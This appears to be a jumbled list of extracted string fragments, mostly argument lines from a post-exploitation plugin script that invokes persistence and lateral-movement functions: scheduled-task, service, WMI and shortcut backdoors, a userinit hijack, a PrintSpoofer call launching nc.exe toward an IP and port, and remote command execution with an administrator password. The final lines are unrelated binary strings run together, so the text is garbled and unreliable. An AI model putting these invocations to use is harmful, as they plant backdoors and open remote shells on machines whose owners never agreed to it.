"C:\\Windows\\Temp\\payload.exe"",bid => $bid), &sharptask_add);"
"C:\\Windows\\Temp\\payload.exe"",schtask_name => ""Some Service"",bid => $bid), &schtaskbackdoor);"
"C:\\Windows\\Temp\\payload.exe"",schtask_name => ""Some Service"",schtask_time => ""hourly"",bid => $bid), &SharPersist_schtask);"
"C:\\Windows\\Temp\\payload.exe"",service_name => ""Some Service"",bid => $bid), &SharPersist_service);"
"C:\\Windows\\WindowsUpdate.log"",bid => $bid), &net_gc);"
"C:\\Windows\\system32\\cmd.exe"",bid => $bid),&InstallAutoRun);"
"C:\\Windows\\system32\\cmd.exe"",bid => $bid),&InstallService);"
"C:\\Windows\\system32\\userinit.exe, $+ $File \"" /f "");"
"C:\\Windows\\temp\\fun.exe"",lnkpath => ""C:\\users\\user\\desktop\\Excel.lnk"",bid => $bid), &stay_BackdoorLNK);"
"C:\\Windows\\temp\\payload.exe"",bid => $bid), &stay_creatservice);"
"C:\\Windows\\temp\\payload.exe"",eventname => ""Debug"",attime => ""startup"",bid => $bid), &stay_wmi);"
"C:\\payload.exe"",bid => $bid), &SharpExec_file);"
"C:\\users\\admin\\desktop"",lnkname => ""Notepad.lnk"",lnktarget => ""C:\\Windows\\temp\\payload.exe"",lnkicon => ""C:\\Windows\\system32\\notepad.exe"",bid => $bid), &stay_NewLNK);"
"C:\\windows\\Temp\\123.txt"",bid => $bid), &Seatbelt_txt);"
"C:\\windows\\temp"",outpath => ""C:\\windows\\Temp"",bid => $bid), &SharpDirLister);"
"C:\\windows\\temp\\123.exe"",bid => $bid), &GetSystem_ladon);"
"c:\\123.txt"",pass => ""123456"",bid => $bid), &EncryptedZIP);	"
"c:\\Windows\\system32\\cmd.exe"",bid => $bid),&InstallBackDoor);"
"c:\\calc"", remotepath => ""c:\\windows\\system32\\calc.exe"",bid => $bid),&WMIHACKER_download);"
"c:\\windows\\Temp\\123.txt"",bid => $bid), &SharpGetTitle);"
"c:\\windows\\system32\\calc.exe"", remotepath => ""C:\\\$Recycle.Bin"",bid => $bid),&WMIHACKER_upload);"
"c:\\windows\\system32\\cmd.exe /c calc"",domain => ""."",user => ""administrator"",pass => ""123456"",bid => $bid), &SCshell);	"
"c:\\windows\\system32\\werfault.exe"";"
"c:\\windows\\temp"",outpath => ""c:\\windows\\temp\\123.zip"",bid => $bid), &EncryptedZIP_nopass);	"
"c:\\windows\\temp\\123.txt"",bid => $bid), &net_type);"
"c:\\windows\\temp\\nc.exe"",NCip => ""8.8.8.8"",NCport => ""8888"",bid => $bid),&PrintSpoofer_nc);"
"c:\\windows\\temp\\payload.exe"",bid => $bid), &sharpwmi_pth_upload);"
"c:\\windows\\temp\\payload.exe"",bid => $bid), &sharpwmi_upload);"
"c:\\www\\html"",Keyword => ""DBPath"",bid => $bid), &sql_path);"
"c:\windows\system32\cmd.exe /c "" & cmd "
"c:\windows\system32\cmd.exe /c "" & cmd & "" > "" & file"
"c:\windows\system32\cmd.exe"" &chr(34)&""""&chr(10)&_"
C:\Program Files\npsCertOpenSystemStoreWChangeServiceConfigWCheckTokenMembershipCreateProcessAsUserWCryptAcquireContextWDoubleLongLeftArrow;DownLeftRightVector;Egyptian_HieroglyphsGNU.sparse.numblocksGetAcceptExSockaddrsGetAdaptersAddressesGetCurrentDirectoryWGetFileAttributesExWGetProcessMemoryInfoGetWindowsDirectoryWGlobalMemoryStatusExHTTP/%d.%d %03d %s
C:\Users\runneradmin\.cargo\registry\src\github.com-1ecc6299db9ec823\gif-0.11.1\src\common.rsassertion failed: `(left == right)`
